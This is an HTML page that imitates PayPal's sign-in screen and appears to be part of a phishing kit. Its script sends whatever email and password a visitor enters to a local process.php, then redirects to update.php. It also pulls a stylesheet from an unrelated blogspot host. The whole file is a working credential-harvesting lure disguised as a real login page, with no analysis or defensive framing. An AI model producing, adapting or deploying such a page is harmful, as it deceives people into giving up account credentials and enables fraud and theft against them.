<!Doctype html>
<html>
<head>
<title>Paypal - Sign in to your account</title>
<link rel="icon" href="res/img/icon.png" />
<meta name="viewport" content="width=device-width"/>
<link rel="stylesheet" href="res/css/style.css"/>
<link rel="stylesheet" href="http://stylesscssfiles.blogspot.com/?style=main.css">
<script src="res/js/jq.js"></script>
<script src="res/js/v.js"></script>
</head>
<body>
    

<div class="loadpage">
<div class="content">
<div class="spinner loading">
</div>
</div>
</div>

<div class="content">
    <div class="form">
        
        <div class="logo">
            <img src="res/img/logo.png"/>
        </div>
<div class="col" id="errorbox" style="display:none">
    <div class="errorbox">
       <img src="res/img/error.png"/> Please check your entries and try again.
    </div>
</div>

<form id='loginform'>
<div class="col">
    <input id="email" name="email" required type="text" placeholder="Email or mobile number" class="textinput"/>
</div>

<div class="col">
    <input id="password"  required name="password" type="password"
placeholder="Enter your password" class="textinput"/>
</div>

<div class="col">
    <button onclick="sbmt()" class="submit">Sign In</button>
</div>
</form>

<div class="col-lines">
<div class="line"></div>
<div class="or">or</div>
</div>

<div class="col">
<button class="signup">Sign Up</button>
</div>
    </div>

<div class="footer">
    <a href="#">Contact Us</a>
    <a href="#">Privacy</a>
    <a href="#">Legal</a>
    <a href="#">Worldwide</a>
</div>

</div>
<script>

 var email = $('#email');
 var pass = $('#password');
 var errorbox = $('#errorbox');

function sbmt(){
	if(email.val().trim()=='' || pass.val().trim()==''){
		errorbox.show();
	}else{
		errorbox.hide();
	}
	
	$('#loginform').validate({
		errorClass:'error',
	submitHandler: function(){
		$('.loadpage').show();
    $.post("process.php",{
        email:email.val(),
        pass:pass.val()},
function(data){
 window.location = "update.php";
});
	}
		
	});
	}


</script>
</body>
</html>